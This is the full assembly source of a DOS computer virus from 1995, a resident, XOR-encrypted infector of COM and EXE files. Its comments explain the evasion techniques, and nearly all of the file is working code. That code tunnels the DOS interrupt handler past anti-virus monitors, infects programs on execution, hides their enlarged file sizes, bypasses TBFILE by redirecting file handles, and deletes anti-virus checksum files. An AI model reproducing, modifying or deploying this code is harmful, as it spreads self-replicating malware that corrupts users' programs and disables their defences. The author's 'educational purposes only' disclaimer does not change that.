;
;	VIRUS07.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of COM/EXE files, encrypted with an
; XOR algorithm. It uses tunneling to install the int21h handler.
;
; The virus infects on execute (4b00h). If an infected file is being
; touched with the directory functions (11h/12h/4eh/4fh), the virus will
; stealth the filesize.
;
; When a file is about to be infected, the file handler is redirected
; to the keyboard handler using funtion 46h. The purpose of this is
; that TBFILE will allow writes to file handles that are normally
; characterbased 'system' handles. Instead of checking if the handle
; points to a character device, tbfile makes it's judgement based on
; the handle number only.
;
; To avoid checksummers, several wellknown anti-virus control files
; are deleted.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
ParagraphSize	equ	VirusSize / 16 + 2
VirusInterrupt	equ	7979h
VirusIdentifier	equ	'bA'

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	mov	ax,es					; Restore segments
	add	ax,10h					; now due to prefetch
	add	word ptr cs:[bp+ExeRegs+2],ax
	add	word ptr cs:[bp+ExeRegs+4],ax

	push	es

	mov	ah,41h
	lea	dx,[bp+AVfile1]
	int	21h
	mov	ah,41h
	lea	dx,[bp+AVfile2]
	int	21h

InstallVirus:
	mov	ax,VirusInterrupt			; Check if in mem
	int	21h
	cmp	ax,VirusIdentifier
	je	AlreadyResident

	mov	ah,4ah					; Get size of mem
	mov	bx,0ffffh
	int	21h
	mov	ah,4ah					; Change size of mem
	sub	bx,ParagraphSize+1			; Make space for virus
	int	21h
	mov	ah,48h					; Allocate memory
	mov	bx,ParagraphSize
	int	21h
	sub	ax,10h					; Compensate org 100h
	mov	es,ax
	mov	di,100h
	lea	si,[bp+offset BeginVirus]
	mov	cx,VirusSize
	rep	movsb					; Copy virus to mem
	push	es
	pop	ds
	inc	byte ptr ds:[0f1h]			; Change block owner

	push	cs
	call	InstallInt21hHandler

AlreadyResident:
	push	cs
	push	cs
	pop	es
	pop	ds

	cmp	byte ptr [bp+ComFlag],1			; Check if COM or EXE
	jne	JumpExeFile

JumpComFile:
	pop	es					; jmp to beginning
	mov	di,100h
	push	di
	lea	si,[bp+ExeHead]
	movsb
	movsw						; Restore first bytes
	retn

JumpExeFile:
	pop	es
	mov	ax,es					; Restore segment regs
	mov	ds,ax					; and ss:sp
	cli
	mov	ss,word ptr cs:[bp+ExeRegs+4]
	mov	sp,word ptr cs:[bp+ExeRegs+6]
	sti

	db	0eah					; and jmp to cs:ip
ExeRegs	dd	0,0					; ip, cs, ss, sp

;---------------------------------------------------------------------
;	Install int21h handler
;---------------------------------------------------------------------

InstallInt21hHandler:
	push	ds					; Jump to tunneler in
	mov	ax,offset @@next1			; new memory
	push	ax
	retf

@@next1:mov	ah,52h					; Get list of lists
	int	21h
	mov	ax,es:[bx-2]				; Get first MCB
	mov	OrigMcb,ax

	mov	ax,3521h				; Get int21
	int	21h
	mov	Int21o,bx
	mov	Int21s,es

	mov	al,01h					; Save int01
	int	21h
	push	bx					; on stack
	push	es

	mov	ah,25h					; Set int01
	mov	dx,offset Int01hHandler
	int	21h

	pushf						; Set trap flag
	pop	ax
	or	ah,1
	push	ax
	popf

	mov	ah,0bh					; Issue dos function
	pushf						; Simulate interrupt
	call	dword ptr Int21o			; for tracing

	pop	ds
	pop	dx

	pushf						; Get flags
	pop	ax
	test	ah,1					; Check trap flag
	pushf
	and	ah,0feh					; Turn off trap flag
	push	ax
	popf

	mov	ax,2501h				; Reset int01
	int	21h

	push	cs
	pop	ds

	popf
	jnz	@@next2

	mov	ah,25h
	mov	dx,offset Int21hHandler
	int	21h
@@next2:retf

Int01hHandler:
	mov	cs:OrigAx,ax				; Save registers
	mov	cs:OrigSi,si
	mov	cs:OrigCx,cx
	pop	si					; Get ip in si
	pop	ax					; cs in ax
	pop	cx					; flags in cx
	push	ds
	mov	ds,ax
	cmp	word ptr [si],05eBh			; Check if tbav
	jne	@@next1
	cmp	byte ptr [si+2],0eah			; Check if tbav
	jne	@@next1
	inc	si					; Skip tbav
	inc	si
@@next1:cmp	byte ptr [si],9ah			; Immediate interseg?
	je	@@next3
	cmp	byte ptr [si],0eah			; Immediate interseg?
	je	@@next3
	cmp	word ptr [si],0ff2eh			; opc prefix=cs?
	jne	@@next2
	cmp	byte ptr [si+2],1eh			; Direct interseg?
	je	@@next4
	cmp	byte ptr [si+2],2eh			; Direct interseg?
	je	@@next4
@@next2:pop	ds
	push	cx
	push	ax
	push	si
	db	0b8h
OrigAx	dw	?
	db	0beh
OrigSi	dw	?
	db	0b9h
OrigCx	dw	?
	iret
@@next3:push	si
	inc	si
	jmp	@@next5
@@next4:push	si
	mov	si,si[3]
@@next5:db	81h,7ch,02h				; cmp ds:si[2], mcb
OrigMcb	dw	?					; See if jmp is to dos
	jnb	@@next6
	push	ax
	mov	ax,si[0]				; Get offset address
	mov	cs:Int21o,ax
	mov	ax,si[2]				; Get segment address
	mov	cs:Int21s,ax
	mov	si[0],offset Int21hHandler		; Install int21 handler
	mov	si[2],cs
	pop	ax
	and	ch,0feh					; Clear trap flag
@@next6:pop	si
	jmp	@@next2

;---------------------------------------------------------------------
;	New int21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ax,VirusInterrupt			; Return installation
	jne	@@next1
	mov	ax,VirusIdentifier
	iret
@@next1:cmp	ax,4b00h				; Check for exec?
	jne	@@next2
	jmp	InfectFile
@@next2:cmp	ah,11h					; If function 11h, 12h
	je	StealthFindMatchingFileFCB
	cmp	ah,12h
	je	StealthFindMatchingFileFCB
	cmp	ah,4eh					; or function 4eh, 4fh
	je	StealthFindMatchingFile
	cmp	ah,4fh
	je	StealthFindMatchingFile
	jmp	OldInt21h				; else do orig int 21h

;---------------------------------------------------------------------
;	FCB & Handle stealth (11h/12h & 4eh/4fh)
;---------------------------------------------------------------------

StealthFindMatchingFileFCB:
	pushf						; Simulate a int call
	push	cs					; cs, ip on the stack
	call	OldInt21h
	or	al,al					; Dir call sucessfull?
	jnz	@@next4					; If not skip it

	push	ax bx es				; Preserve registers

	mov	ah,62h					; Get current PSP to
	int	21h					; es:bx
	mov	es,bx
	cmp	bx,es:[16h]				; Is the PSP ok??
	jnz	@@next3					; If not quit

	mov	bx,dx
	mov	al,[bx]					; al = current drive
	push	ax					; FFh = extended FCB
	mov	ah,2fh					; Get DTA-area
	int	21h
	pop	ax
	inc	al					; Is it extended FCB?
	jnz	@@next1
	add	bx,7					; If so add 7
@@next1:mov	al,byte ptr es:[bx+17h]			; Get seconds field
	and	al,1fh
	xor	al,1dh					; Is it infected??
	jnz	@@next3					; no - don't hide size

	cmp	word ptr es:[bx+1dh],VirusSize		; If size is smaller
	ja	@@next2					; than VirusSize
	cmp	word ptr es:[bx+1fh],0			; It can't be infected
	je	@@next3					; So don't hide it
@@next2:sub	word ptr es:[bx+1dh],VirusSize		; Else sub VirusSize
	sbb	word ptr es:[bx+1fh],0
@@next3:pop	es bx ax				; Restore regs
@@next4:iret						; Return to program

StealthFindMatchingFile:
	pushf						; Simulate a int call
	push	cs					; IP on stack and jmp
	call	OldInt21h				; to int handler
	jc	@@next3					; Ret if no more file

	push	ax es bx				; Preserve registers
	mov	ah,2fh					; Get DTA-area
	int	21h

	mov	ax,es:[bx+16h]
	and	ax,1fh					; Is the PSP ok??
	xor	al,1dh
	jnz	@@next2					; if not - jmp

	cmp	word ptr es:[bx+1ah],VirusSize		; Don't sub all files
	ja	@@next1
	cmp	word ptr es:[bx+1ch],0
	je	@@next2
@@next1:sub	word ptr es:[bx+1ah],VirusSize		; Sub VirusSize
	sbb	word ptr es:[bx+1ch],0
@@next2:pop	bx es ax				; Restore registers
@@next3:retf	2					; Ret and pop stack

;---------------------------------------------------------------------
;	File executed with 4b00h
;---------------------------------------------------------------------

InfectFile:
	push es bp ax bx cx si di ds dx

	mov	ax,4300h				; Get attrib
	int	21h
	push	cx
	mov	ax,4301h				; and clear attrib
	xor	cx,cx
	int	21h

	mov	ax,3d02h				; Open file
	int	21h
	xchg	ax,dx

	push	cs
	push	cs
	pop	ds
	pop	es

	mov	ah,45h					; Duplicate handle
	xor	bx,bx
	int	21h
	mov	FileHnd,ax

	mov	ah,46h					; Redirect handle
	mov	bx,dx
	xor	cx,cx
	int	21h
	xchg	ax,bx

	mov	ax,5700h				; Save time/date
	int	21h
	push	dx
	push	cx
	and	cl,1fh
	xor	cl,1dh					; and check infection
	jne	ReadFileHeader
	jmp	CloseFile

ReadFileHeader:
	mov	ah,3fh					; Read first 24 bytes
	mov	cx,18h
	mov	dx,offset ExeHead			; to ExeHead
	int	21h

	mov	al,2h					; Go EOF
	call	SetFilePointer

	cmp	word ptr ExeHead,'ZM'
	je	InfectExeFile
	cmp	word ptr ExeHead,'MZ'
	jne	InfectComFile

InfectExeFile:
	mov	byte ptr ComFlag,0

	mov	di,offset ExeRegs			; ExeRegs = IP/CS
	mov	si,offset ExeHead+14h
	movsw
	movsw

	mov	si,offset ExeHead+0eh			; EXEstack = SS/SP
	movsw
	movsw

	mov	cx,10h
	div	cx
	sub	ax,word ptr [ExeHead+8h]
	mov	word ptr [ExeHead+14h],dx		; Calculate CS:IP
	mov	word ptr [ExeHead+16h],ax
	add	ax,100
	mov	word ptr [ExeHead+0eh],ax		; SS:SP
	mov	word ptr [ExeHead+10h],100h

	call	WriteVirus

	mov	al,2h					; Go EOF
	call	SetFilePointer

	mov	cx,512					; Calculate new size
	div	cx					; in 512 byte pages
	inc	ax
	mov	word ptr [ExeHead+2],dx
	mov	word ptr [ExeHead+4],ax

	xor	al,al					; Go SOF
	call	SetFilePointer

	mov	cx,18h					; Write EXE header
	mov	dx,offset ExeHead
	mov	ah,40h
	int	21h

	jmp	CloseFile

InfectComFile:
	mov	byte ptr ComFlag,1

	add	ax,offset EntryPoint-103h		; Calculate entryjmp
	mov	word ptr [ComHead+1],ax

	call	WriteVirus

	xor	al,al					; Go SOF
	call	SetFilePointer

	mov	cx,3
	mov	dx,offset ComHead
	mov	ah,40h
	int	21h

CloseFile:
	mov	ax,5701h				; Restore time/date
	pop	cx
	pop	dx
	or	cl,00011101b
	and	cl,11111101b				; and mark infected
	int	21h

	mov	ah,46h					; Redirect handle
	mov	bx,FileHnd
	xor	cx,cx
	int	21h

	mov	ah,3eh					; Close handle
	int	21h

	pop	cx
	pop	dx
	pop	ds
	mov	ax,4301h
	int	21h

	pop	di si cx bx ax bp es

OldInt21h:						; Jump to old int21h
	db	0eah
Int21o	dw	?
Int21s	dw	?

;-------------------------------------------------------------------------
;	Helper functions
;-------------------------------------------------------------------------

SetFilePointer:
	mov	ah,42h					; Jump in file
	xor	cx,cx					; This saves a few
	cwd						; bytes as it's used
	int	21h					; a few times
	ret

WriteVirus:
	mov	ah,2ch					; Get random number
	int	21h
	mov	word ptr ds:[Key],dx			; store it

	mov	ax,08d00h
	mov	es,ax
	mov	di,100h
	mov	si,di
	mov	cx,(VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	xor	bp,bp
	call	EncryptDecrypt				; and encrypt

	mov	ah,40h					; Write it to file
	mov	cx,VirusSize
	mov	dx,offset BeginVirus
	int	21h

	push	cs
	pop	ds
	ret

AVfile1	db	'ANTI-VIR.DAT',0
AVfile2	db	'CHKLIST.MS',0
FileHnd	dw	0					; Filehandle
ComHead	db	0e9h,00h,00h				; Buffer for entryjmp
ComFlag	db	1
ExeHead	db	0cdh,20h,00h,21 dup (0)

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	GetDeltaOffset
EncryptDecrypt:
	mov	dx,word ptr ds:[bp+Key]			; routine here to
	lea	si,[bp+BeginEncryptedSection]		; fool TBAV/F-PROT
	mov	cx,(EndEncryptedSection-BeginEncryptedSection)/2
@@loop:	xor	word ptr ds:[si],dx			; Simple xor-loop
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret
Key	dw	0					; en/decrypt value
GetDeltaOffset:
	pop	bp
	sub	bp,offset EncryptDecrypt		; Get delta offset
	push	cs
	pop	ds
	call	EncryptDecrypt				; Decrypt virus
	jmp	BeginEncryptedSection

EndVirus:

END
